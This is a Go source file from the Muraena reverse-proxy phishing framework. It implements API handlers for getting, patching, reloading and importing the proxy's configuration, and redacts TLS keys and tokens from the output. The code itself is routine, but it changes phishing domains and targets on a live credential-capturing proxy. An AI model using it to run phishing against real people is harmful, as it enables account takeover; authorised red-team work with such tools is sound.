package api

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/pelletier/go-toml"

	"github.com/muraenateam/muraena/core/proxy"
	"github.com/muraenateam/muraena/session"
)

// replacerRefreshPrefixes lists the dotted config paths that Replacer.Init
// bakes in at init time. If a patch touches any of these (or a sub-path of
// one of these), the live Replacer must be rebuilt via proxy.RefreshReplacer,
// otherwise it keeps stale values (e.g. an old phishing domain or target)
// even though GET /config now reports the new, already-applied values.
var replacerRefreshPrefixes = []string{
	"Origins",
	"Proxy.Target",
	"Proxy.Phishing",
	"Transform.Response.CustomContent",
}

// touchesReplacerConfig reports whether the given dotted patch paths touch
// any config value that Replacer.Init reads.
func touchesReplacerConfig(paths []string) bool {
	for _, p := range paths {
		for _, pre := range replacerRefreshPrefixes {
			if p == pre || strings.HasPrefix(p, pre+".") || strings.HasPrefix(pre, p+".") {
				return true
			}
		}
	}
	return false
}

var secretPaths = [][]string{
	{"TLS", "CertificateContent"}, {"TLS", "KeyContent"}, {"TLS", "RootContent"},
	{"TLS", "Certificate"}, {"TLS", "Key"}, {"TLS", "Root"},
	{"Redis", "Password"},
	{"Telegram", "BotToken"},
}

func redact(m map[string]interface{}) {
	for _, path := range secretPaths {
		cur := m
		for i, key := range path {
			if i == len(path)-1 {
				if _, ok := cur[key]; ok {
					cur[key] = ""
				}
				break
			}
			next, ok := cur[key].(map[string]interface{})
			if !ok {
				break
			}
			cur = next
		}
	}
}

func (s *Server) handleGetConfig(w http.ResponseWriter, r *http.Request) {
	b, err := json.Marshal(s.sess.Config())
	if err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	var m map[string]interface{}
	_ = json.Unmarshal(b, &m)
	redact(m)
	writeJSON(w, 200, m)
}

// Configuration is aliased for brevity in this file.
type Configuration = session.Configuration

func (s *Server) persistConfig(c *Configuration) error {
	if s.sess.Options.ConfigFilePath == nil || *s.sess.Options.ConfigFilePath == "" {
		return nil // nothing to persist to
	}
	b, err := toml.Marshal(c)
	if err != nil {
		return err
	}
	return writeFile(*s.sess.Options.ConfigFilePath, b)
}

func (s *Server) applyCandidate(cand *Configuration, refreshReplacer bool) error {
	if err := cand.DoChecks(); err != nil {
		return err
	}
	s.sess.SwapConfig(cand)
	if refreshReplacer {
		_ = proxy.RefreshReplacer(s.sess)
	}
	return s.persistConfig(cand)
}

func (s *Server) handlePatchConfig(w http.ResponseWriter, r *http.Request) {
	var patch map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&patch); err != nil {
		writeError(w, http.StatusBadRequest, "bad_request", "invalid patch body")
		return
	}
	cand, restart, err := s.sess.BuildCandidate(patch)
	if err != nil {
		writeError(w, http.StatusBadRequest, "bad_request", err.Error())
		return
	}
	if len(restart) > 0 {
		writeJSON(w, http.StatusConflict, map[string]interface{}{
			"restartRequired": true, "fields": restart,
		})
		return
	}
	touchedReplacerConfig := touchesReplacerConfig(session.CollectPaths(patch))
	if err := s.applyCandidate(cand, touchedReplacerConfig); err != nil {
		writeError(w, http.StatusBadRequest, "invalid_config", err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "applied"})
}

func (s *Server) handleReloadConfig(w http.ResponseWriter, r *http.Request) {
	if err := s.sess.GetConfiguration(); err != nil {
		writeError(w, http.StatusBadRequest, "invalid_config", err.Error())
		return
	}
	_ = proxy.RefreshReplacer(s.sess)
	writeJSON(w, 200, map[string]string{"status": "reloaded"})
}

func (s *Server) handleImportConfig(w http.ResponseWriter, r *http.Request) {
	// Same pipeline as PATCH; used by recon to merge origins + secrets patterns.
	s.handlePatchConfig(w, r)
}

func (s *Server) handleRestartFields(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]interface{}{"fields": session.RestartPrefixes()})
}
